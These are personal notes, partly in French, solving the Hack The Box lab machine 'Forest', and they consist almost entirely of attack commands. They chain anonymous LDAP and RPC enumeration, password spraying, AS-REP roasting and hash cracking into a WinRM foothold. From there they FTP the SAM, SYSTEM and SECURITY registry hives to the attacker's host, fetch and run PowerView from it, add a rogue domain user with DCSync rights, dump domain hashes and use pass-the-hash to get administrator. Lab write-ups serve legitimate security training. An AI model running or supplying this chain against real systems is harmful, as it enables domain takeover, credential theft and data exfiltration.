# Forest Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

sleep300; nmap -p- -oA fullforst 10.10.10.161

smbclient -L 10.10.10.161

ldapsearch -h 10.10.10.161 -x 

ldapsearch -H ldap://10.10.10.161 -x -s base namingcontexts

ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" > ldap-anonymous.out

ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' | grep -i samaccountname

ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' | grep -i userPrincipalName

ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' | grep -i pwdLastSet

ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' samaccountname userPrincipalName pwdLastSet

> google pwdLastSet ldap to human

https://www.epochconverter.com/ldap

### transformer les commandes en une liste clean de users et mails :

ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=User)' sAMAccountName | grep sAMAccountName | awk '{print $2}' > userlist.ldap

ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=User)' userPrincipalName | grep userPrincipalName | awk '{print $2}' > listmail.ldap

rpcclient -U '' -N 10.10.10.161

enumdomusers

queryusergroups 0x47b

querygroup 0x47c

queryuser svc-alfresco


### recuperer la policy des passwords de l'AD

crackmapexec smb 10.10.10.161 --pass-pol -u '' -p ''

crackmapexec smb 10.10.10.161 --pass-pol -u 'user.lst' -p 'passwd.lst'

password spray avec crackmapexec

crackmapexec smb 10.10.10.161 -u 'user.lst' -p 'passwd.lst'

/usr/bin/impacket-GetNPUsers -dc-ip 10.10.10.161 -request htb.local/

/usr/bin/impacket-GetNPUsers -dc-ip 10.10.10.161 -request htb.local/ -format hashcat

hashcat --example-hashes | grep -i krb

hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt # ippsec ajoute -r rules/InsidePro-PasswordsPro.rule essaye de comprendre pk


# ${{\color{purple}Initial Foothold}}\ $


crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' --shares

#Ici j'aurai pu try un gpp decrypt regarder ce que c'est
# le port 5985 est important c'est Win-RM (powershell remoting)

locate evil-winrm
/usr/bin/evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161

# ${{\color{purple}Exploitation}}\ $

# ${{\color{purple}Privilege Escalation}}\ $

find . | grep exe$
impacket-smbserver idk $(pwd) -smb2support -user user -password idkazewxc123
$pass = convertto-securestring 'idkazewxc123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('ippsec', $pass)
New-PSDrive -PSProvider FileSystem \\10.10.16.5


systemctl restart pure-ftpd

echo 'open 10.10.16.5 21'> ftp.txt
echo 'USER offsec'>> ftp.txt
echo 'lab'>> ftp.txt
echo 'bin'>> ftp.txt
echo 'PUT C:\windows\system32\config\SYSTEM'>> ftp.txt
echo 'PUT C:\windows\system32\config\SAM'>> ftp.txt
echo 'PUT C:\windows\system32\config\SECURITY'>> ftp.txt
echo 'bye'>> ftp.txt

ftp –v –n –s:ftp.txt 
systemctl stop pure-ftpd

------------------------------------------
New-PSDrive -Name ippsec4 -PSProvider FileSystem -Root \\10.10.16.5\test
cd ippsec4:
/usr/share/doc/python3-impacket/examples/smbserver.py test /mnt/share -smb2support

Bloodhound:
si il y a une install de bloodhound delet :
rm /usr/share/neo4j/data/dbms/auth
neo4j console
neo4j password : sparta-castro-union-labor-pluto-9066

./BloodHound --no-sandbox
.\SharpHound.exe -c all

Bloodhound search :
-Mark User as Owned
-search for Shortest Path from Owned Principals

net user evil evil123 /add /domain
net group "Exchange Windows Permissions"
net group "Exchange Windows Permissions" /add evil

IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5:8080/PowerView.ps1')
$pass = convertto-securestring 'evil123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('HTB\evil', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity evil -Rights DCSync

/usr/bin/impacket-secretsdump htb.local/evil:evil123@10.10.10.161
crackmapexec smb 10.10.10.161 -u 'administrator' -H 32693b11e6aa90eb43d32c72a07ceea6

/usr/bin/impacket-psexec -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161




-note ne pas oublier / dans impacket 
/usr/bin/impacket-GetNPUsers -dc-ip 10.10.10.161 -request htb.local/
